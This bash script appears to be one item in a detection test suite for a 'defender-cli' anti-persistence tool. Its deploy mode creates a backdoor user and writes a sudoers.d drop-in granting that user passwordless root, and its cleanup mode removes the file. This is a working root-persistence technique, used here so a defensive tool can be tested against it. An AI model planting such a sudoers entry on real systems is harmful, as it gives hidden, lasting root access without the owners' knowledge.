#!/usr/bin/env bash
# Sudoers persistence: a drop-in granting the backdoor user NOPASSWD root.
# Detected by: defender-cli anti-persistence --sudoers
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }

SUDOERS_DROP="/etc/sudoers.d/defender-test-nopasswd"
BACKDOOR="defender-test-backdoor"
TAG="DEFENDER-TEST-sudoers"

case "${1:-}" in
  deploy)
    # Create the backdoor user if 12_backdoor_user.sh hasn't run yet
    if ! id "$BACKDOOR" &>/dev/null; then
      useradd --no-create-home --shell /bin/bash --comment "DEFENDER-TEST-auto" "$BACKDOOR" 2>/dev/null || true
    fi
    echo "# $TAG" > "$SUDOERS_DROP"
    echo "$BACKDOOR ALL=(ALL) NOPASSWD: ALL" >> "$SUDOERS_DROP"
    chmod 440 "$SUDOERS_DROP"
    echo "[+] 19_sudoers_entry: $SUDOERS_DROP installed"
    ;;
  cleanup)
    rm -f "$SUDOERS_DROP"
    # Remove user only if we created it here (i.e., not if backdoor_user script owns it)
    echo "[-] 19_sudoers_entry: $SUDOERS_DROP removed (user '$BACKDOOR' left; run 12_backdoor_user cleanup to remove)"
    ;;
  *) echo "Usage: $0 deploy|cleanup"; exit 1 ;;
esac
